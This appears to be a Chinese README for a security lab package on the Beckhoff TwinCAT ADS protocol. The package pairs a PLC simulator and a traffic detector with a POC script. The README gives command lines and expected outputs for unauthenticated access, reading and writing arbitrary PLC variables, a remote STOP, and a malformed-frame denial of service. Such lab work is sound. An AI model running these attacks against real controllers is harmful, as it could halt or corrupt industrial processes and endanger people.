# ADS 协议 (Automation Device Specification)

## 协议信息

| 属性 | 说明 |
|------|------|
| **排名** | 17 |
| **协议名称** | ADS (Automation Device Specification) |
| **主要应用** | Beckhoff TwinCAT PLC |
| **传输层** | TCP / UDP |
| **默认端口** | 48898 (TCP/UDP) |
| **重要性** | ★★★★ |

## 协议简介

ADS (Automation Device Specification) 是 Beckhoff 公司 TwinCAT 系统的核心通信协议。它基于 AMS (Automation Message Specification) 报文格式，使用 AMS NetId + Port 进行设备寻址。ADS 支持读写 PLC 变量、设备状态控制、符号表访问、通知订阅等功能。

## 文件说明

| 文件 | 说明 |
|------|------|
| `simulator.py` | ADS 协议模拟器 - 模拟 TwinCAT PLC ADS 服务 |
| `detector.py` | ADS 协议检测逻辑 - 识别和分析 AMS 流量 |
| `vuln_simulator.py` | 漏洞模拟器 - 模拟 ADS 常见安全漏洞 |
| `poc.py` | POC 代码 - ADS 漏洞利用验证 |
| `README.md` | 本说明文件 |

## 模拟器使用

```bash
python simulator.py
python simulator.py --host 0.0.0.0 --port 48898
```

## 检测器使用

```bash
python detector.py
```

## POC 使用

```bash
# 未授权访问
python poc.py --target 192.168.1.100 --vuln unauthorized

# 变量读取
python poc.py --target 192.168.1.100 --vuln read_var --offset 0x1000

# 变量写入
python poc.py --target 192.168.1.100 --vuln write_var --offset 0x1004 --value "00000000"

# 信息泄露
python poc.py --target 192.168.1.100 --vuln info_leak

# 全部检测
python poc.py --target 192.168.1.100 --vuln all
```

## 已知漏洞

| 漏洞 | 严重程度 | 说明 |
|------|----------|------|
| 未授权访问 | 严重 | ADS 默认无认证机制 |
| 变量任意读取 | 高危 | 远程读取所有 PLC 变量 |
| 变量任意写入 | 严重 | 远程修改 PLC 控制逻辑 |
| 命令注入 | 严重 | 远程切换 PLC 运行模式 |
| 拒绝服务 | 高危 | 畸形包导致 ADS 服务崩溃 |

## POC 验证方法

### 前置条件
1. 启动 ADS 模拟器（模拟 TwinCAT PLC）：`python simulator.py`
2. 模拟器监听在 TCP 48898 端口
3. 默认 AMS NetId: `192.168.0.1.1.1`，AMS Port: 851

### 验证步骤

#### 1. 未授权访问
```bash
python poc.py --target 127.0.0.1 --vuln unauthorized
```
**验证原理**：ADS 协议默认无认证机制，发送 ADS 命令 1（读取设备信息）可获取 PLC 设备名称和版本。

**预期输出**：
```
[+] 未授权访问成功! 设备: CX-Embedded v3.1
```

#### 2. 变量读取
```bash
python poc.py --target 127.0.0.1 --vuln read --offset 0x1000
```
**验证原理**：使用 ADS 命令 2（读取）直接读取指定内存地址的 PLC 变量值。

**预期输出**：
```
[+] 读取成功: [hex values]
    INT: 172 | FLOAT: 2.41e-43
```

#### 3. 远程 STOP PLC（高危，谨慎执行）
```bash
python poc.py --target 127.0.0.1 --vuln stop
```
**验证原理**：使用 ADS 命令 5（WriteControl）将 PLC 状态切换为 STOP 模式。

⚠️ 注意：此操作将停止目标 PLC 运行！执行时会要求输入 `yes` 确认。

**预期输出**：
```
[*] POC: ADS WriteControl — 远程停止 PLC！
[!] 警告: 此操作将停止目标 PLC 运行!
    确认? (yes/no): yes
[+] 远程 STOP 命令已发送!
```

#### 4. 拒绝服务
```bash
python poc.py --target 127.0.0.1 --vuln dos
```
**验证原理**：发送大量畸形 ADS 帧（填充 0xFF），测试模拟器的异常处理能力。

**预期输出**：
```
[+] 发送 50 个畸形帧
```

#### 5. 全扫描
```bash
python poc.py --target 127.0.0.1 --vuln all
```
**预期输出**：依次执行以上 4 项测试，末尾生成扫描报告。

### 通过标准
- 模拟器正常运行，TCP 48898 端口可连接
- 未授权访问、变量读取返回有效设备信息
- 远程 STOP 命令成功发送（确认后无异常断开）
- DoS 畸形帧全部发送成功

### 自动验证
```bash
python run_verify_all.py
```
脚本会自动启动 ADS 模拟器 → 运行 POC 测试 → 停止模拟器。|
